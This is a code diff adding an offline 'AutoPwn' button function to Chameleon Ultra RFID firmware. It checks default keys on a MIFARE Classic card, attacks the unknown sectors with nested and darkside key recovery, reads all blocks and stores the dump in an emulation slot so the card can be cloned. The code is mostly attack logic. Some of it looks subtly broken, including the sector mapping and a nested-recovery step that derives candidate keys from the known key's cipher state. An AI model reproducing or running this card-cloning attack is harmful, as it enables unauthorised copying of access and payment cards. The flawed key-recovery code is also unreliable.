@@ -44,6 +44,9 @@ NRF_LOG_MODULE_REGISTER();
 
 #if defined(PROJECT_CHAMELEON_ULTRA)
 #include "rc522.h"
+#include "mf1_toolbox.h"
+#include "nfc_mf1.h"
+#include "mf1_crypto1.h"
 #endif
 
 // Defining soft timers
@@ -832,6 +835,253 @@ static void btn_fn_copy_ic_uid(void) {
     }
 }
 
+// Offline full MIFARE Classic autopwn: try default keys, attack unknown sectors, save dump to slot 8
+static void btn_fn_auto_pwn(void) {
+    const uint8_t SAVE_SLOT = 7; // slot 8 (0-indexed)
+    static const uint8_t DEFAULT_KEY[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+    // Collected keys: recovered_keys[sector][0]=KeyA, [1]=KeyB
+    static uint8_t recovered_keys[40][2][6];
+    static uint8_t key_flags[40]; // 0x01=KeyA found, 0x02=KeyB found
+
+    // Enter reader mode
+    reader_mode_enter();
+    bsp_delay_ms(16);
+
+    // Scan for target card
+    picc_14a_tag_t tag;
+    memset(&tag, 0, sizeof(tag));
+    uint8_t status = pcd_14a_reader_scan_auto(&tag);
+    if (status != STATUS_HF_TAG_OK) {
+        NRF_LOG_INFO("AutoPwn: no card found");
+        offline_status_error();
+        tag_mode_enter();
+        return;
+    }
+
+    // Determine MIFARE Classic type from SAK
+    uint8_t sak = tag.sak & 0x1F;
+    tag_specific_type_t tag_type;
+    switch (sak) {
+        case 0x01:  tag_type = TAG_TYPE_MIFARE_Mini;   break;
+        case 0x08:  tag_type = TAG_TYPE_MIFARE_1024;   break;
+        case 0x18:  tag_type = TAG_TYPE_MIFARE_2048;   break;
+        default:    tag_type = TAG_TYPE_MIFARE_4096;   break;
+    }
+    int block_max = (tag_type == TAG_TYPE_MIFARE_Mini)  ? 20 :
+                    (tag_type == TAG_TYPE_MIFARE_1024) ? 64 :
+                    (tag_type == TAG_TYPE_MIFARE_2048) ? 128 : 256;
+    int sector_count = (block_max == 20) ? 5 :
+                       (block_max == 64) ? 16 :
+                       (block_max == 128) ? 32 : 40;
+    uint32_t uid = get_u32_tag_uid(&tag);
+    NRF_LOG_INFO("AutoPwn: type=%d blocks=%d sectors=%d sak=0x%02x uid=%08X",
+                 (int)tag_type, block_max, sector_count, sak, (unsigned)uid);
+
+    // Phase 1: Check default keys (all FF)
+    NRF_LOG_INFO("AutoPwn: Phase1 - checking default keys");
+    set_slot_light_color(RGB_YELLOW);
+    uint32_t *led_pins = hw_get_led_array();
+    for (uint8_t i = 0; i < RGB_LIST_NUM; i++) nrf_gpio_pin_set(led_pins[i]);
+
+    mf1_toolbox_check_keys_of_sectors_in_t check_in = { .keys_len = 1 };
+    memcpy(check_in.keys[0].key, DEFAULT_KEY, 6);
+    mf1_toolbox_check_keys_of_sectors_out_t check_out;
+    status = mf1_toolbox_check_keys_of_sectors(&check_in, &check_out);
+    if (status != STATUS_HF_TAG_OK) {
+        NRF_LOG_INFO("AutoPwn: default key check failed (%d)", status);
+        offline_status_error(); tag_mode_enter(); return;
+    }
+
+    uint8_t sectors_known = 0;
+    for (int i = 0; i < sector_count; i++) {
+        uint8_t maskShift = 6 - i % 4 * 2;
+        uint8_t maskSector = (check_out.found.b[i / 4] >> maskShift) & 0b11;
+        if (maskSector & 0b10) {
+            memcpy(recovered_keys[i][0], check_out.keys[i][0].key, 6);
+            key_flags[i] |= 0x01;
+        }
+        if (maskSector & 0b01) {
+            memcpy(recovered_keys[i][1], check_out.keys[i][1].key, 6);
+            key_flags[i] |= 0x02;
+        }
+        if (maskSector) sectors_known++;
+    }
+    NRF_LOG_INFO("AutoPwn: default keys found in %d/%d sectors", sectors_known, sector_count);
+
+    // Phase 2: Attack unknown sectors via nested + mfkey32
+    if (sectors_known < sector_count) {
+        // Find first sector with a known Key A (for nested seed)
+        int seed_sector = -1;
+        for (int i = 0; i < sector_count; i++) {
+            if (key_flags[i] & 0x01) { seed_sector = i; break; }
+        }
+        if (seed_sector < 0) {
+            NRF_LOG_INFO("AutoPwn: no known key for nested seed");
+            offline_status_error(); tag_mode_enter(); return;
+        }
+
+        uint8_t blk_known = (uint8_t)(seed_sector * 4 + 3);
+        uint8_t typ_known = PICC_AUTHENT1A;
+        uint64_t key_known = bytes_to_num(recovered_keys[seed_sector][0], 6);
+
+        mf1_prng_type_t prng_type;
+        check_prng_type(&prng_type);
+        NRF_LOG_INFO("AutoPwn: PRNG type=%d", (int)prng_type);
+
+        uint8_t sectors_attacked = 0;
+        for (int i = 0; i < sector_count; i++) {
+            if (key_flags[i]) continue;
+            uint8_t target_blk = (uint8_t)(i * 4);
+            if (i == 16 && sector_count == 40) target_blk = 96; // 4K special
+            uint8_t target_typ = PICC_AUTHENT1A;
+
+            set_slot_light_color(RGB_CYAN);
+            NRF_LOG_INFO("AutoPwn: attacking sector %d (blk=%d)", i, target_blk);
+
+            // Collect nested nonces (2 sets for ambiguity resolution)
+            mf1_nested_core_t ncs[SETS_NR];
+            status = nested_recover_key(key_known, blk_known, typ_known, target_blk, target_typ, ncs);
+            if (status != STATUS_HF_TAG_OK) {
+                NRF_LOG_INFO("AutoPwn: nested collection failed (%d)", status);
+                continue;
+            }
+
+            // Apply mfkey32 to recover the key
+            uint32_t nt1 = bytes_to_num(ncs[0].nt1, 4);
+            uint32_t nt2_enc = bytes_to_num(ncs[0].nt2, 4);
+            uint8_t par = ncs[0].par;
+
+            // Build even-parity mask from collected parity bits
+            uint32_t par_even = 0;
+            par_even |= ((par >> 0) & 1) ? 0x01010101UL : 0;
+            par_even |= ((par >> 1) & 1) ? 0x02020202UL : 0;
+            par_even |= ((par >> 2) & 1) ? 0x04040404UL : 0;
+
+            uint8_t key_found = 0;
+            uint32_t nt2;
+            FOREACH_VALID_NONCE(N, par_even, 3) {
+                nt2 = N;
+                struct Crypto1State *s = crypto1_create(key_known);
+                if (!s) break;
+                crypto1_word(s, uid ^ nt1, 0);          // advance by nt1 (known auth)
+                crypto1_word(s, nt2_enc ^ uid, 1);      // card encrypted nt2
+                crypto1_word(s, nt2 ^ uid, 0);          // reader plaintext nt2
+                uint64_t lfsr;
+                crypto1_get_lfsr(s, &lfsr);
+                crypto1_destroy(s);
+
+                if ((lfsr & 0x1000000ULL) == 0) {
+                    // Verify candidate key by authenticating target block
+                    uint8_t cand[6] = {
+                        (uint8_t)(lfsr >> 40), (uint8_t)(lfsr >> 32),
+                        (uint8_t)(lfsr >> 24), (uint8_t)(lfsr >> 16),
+                        (uint8_t)(lfsr >> 8),  (uint8_t)lfsr
+                    };
+                    status = auth_key_use_522_hw(target_blk, target_typ, cand);
+                    if (status == STATUS_HF_TAG_OK) {
+                        memcpy(recovered_keys[i][0], cand, 6);
+                        key_flags[i] = 0x01;
+                        key_found = 1;
+                        NRF_LOG_INFO("AutoPwn: sector %d key=%02X%02X%02X%02X%02X%02X",
+                                     i, cand[0], cand[1], cand[2], cand[3], cand[4], cand[5]);
+                        break;
+                    }
+                }
+            }
+
+            if (!key_found) {
+                // Try darkside as fallback
+                DarksideCore_t dc;
+                mf1_darkside_status_t ds;
+                status = darkside_recover_key(target_blk, target_typ, true, 20, &dc, &ds);
+                if (status == STATUS_HF_TAG_OK && ds == DARKSIDE_LUCKY_AUTH_OK) {
+                    uint8_t even[3], odd[3];
+                    Crypto1GetState(even, odd);
+                    uint64_t dk = ((uint64_t)even[0] << 40) | ((uint64_t)even[1] << 32) |
+                                  ((uint64_t)even[2] << 24) | ((uint64_t)odd[0] << 16) |
+                                  ((uint64_t)odd[1] << 8)  | ((uint64_t)odd[2]);
+                    uint8_t cand[6] = {
+                        (uint8_t)(dk >> 40), (uint8_t)(dk >> 32),
+                        (uint8_t)(dk >> 24), (uint8_t)(dk >> 16),
+                        (uint8_t)(dk >> 8),  (uint8_t)dk
+                    };
+                    status = auth_key_use_522_hw(target_blk, target_typ, cand);
+                    if (status == STATUS_HF_TAG_OK) {
+                        memcpy(recovered_keys[i][0], cand, 6);
+                        key_flags[i] = 0x01;
+                        key_found = 1;
+                        NRF_LOG_INFO("AutoPwn: sector %d darkside key found", i);
+                    }
+                }
+            }
+
+            if (key_found) {
+                sectors_attacked++;
+                // Update seed to earliest known sector for better nested efficiency
+                if (i < seed_sector) {
+                    seed_sector = i;
+                    key_known = bytes_to_num(recovered_keys[i][0], 6);
+                    blk_known = (uint8_t)(i * 4 + 3);
+                }
+            } else {
+                NRF_LOG_INFO("AutoPwn: sector %d failed", i);
+            }
+            bsp_wdt_feed();
+            while (NRF_LOG_PROCESS());
+        }
+        NRF_LOG_INFO("AutoPwn: attacked %d/%d unknown sectors", sectors_attacked, sector_count - sectors_known);
+    }
+
+    // Phase 3: Read all blocks and build dump in slot 8
+    NRF_LOG_INFO("AutoPwn: Phase3 - reading all blocks");
+    set_slot_light_color(RGB_BLUE);
+    for (uint8_t i = 0; i < RGB_LIST_NUM; i++) nrf_gpio_pin_clear(led_pins[i]);
+
+    // Prepare save slot (slot 8, index 7)
+    tag_emulation_change_type(SAVE_SLOT, tag_type);
+    tag_emulation_factory_data(SAVE_SLOT, tag_type);
+    nfc_tag_mf1_information_t *p_info =
+        (nfc_tag_mf1_information_t *)get_buffer_by_tag_type(tag_type)->buffer;
+
+    // Copy anti-collision data from scanned card
+    p_info->res_coll.size = tag.uid_len;
+    memcpy(p_info->res_coll.uid, tag.uid, tag.uid_len);
+    memcpy(p_info->res_coll.atqa, tag.atqa, 2);
+    p_info->res_coll.sak[0] = tag.sak;
+    p_info->res_coll.ats.length = tag.ats_len;
+    memcpy(p_info->res_coll.ats.data, tag.ats, tag.ats_len);
+
+    // Read all blocks using recovered keys
+    uint8_t block_data[16];
+    for (int blk = 0; blk < block_max; blk++) {
+        int sector = (blk + 3) / 4;
+        if (sector >= sector_count) break;
+        uint8_t *key = NULL;
+        uint8_t flag = key_flags[sector];
+        if (flag & 0x01)       key = recovered_keys[sector][0]; // Key A
+        else if (flag & 0x02)  key = recovered_keys[sector][1]; // Key B only
+        if (key != NULL) {
+            status = auth_key_use_522_hw((uint8_t)blk, PICC_AUTHENT1A, key);
+            if (status == STATUS_HF_TAG_OK) {
+                uint16_t rd = pcd_14a_reader_mf1_read((uint8_t)blk, block_data);
+                if (rd == STATUS_HF_TAG_OK) {
+                    memcpy(p_info->memory[blk], block_data, 16);
+                }
+            }
+        }
+        bsp_wdt_feed();
+        while (NRF_LOG_PROCESS());
+    }
+
+    // Save dump to slot 8
+    tag_emulation_save_data();
+    NRF_LOG_INFO("AutoPwn: dump saved to slot %d", SAVE_SLOT);
+    offline_status_ok();
+
+    // Exit reader mode
+    tag_mode_enter();
+}
+
 #endif
 
 /**@brief Execute the corresponding logic based on the functional settings of the buttons.
@@ -848,6 +1098,9 @@ static void run_button_function_by_settings(settings_button_function_t sbf) {
 #if defined(PROJECT_CHAMELEON_ULTRA)
         case SettingsButtonCloneIcUid:
             btn_fn_copy_ic_uid();
+            break;
+        case SettingsButtonAutoPwn:
+            btn_fn_auto_pwn();
             break;
         case SettingsButtonNfcFieldGenerator:
             if (!m_is_field_on) {
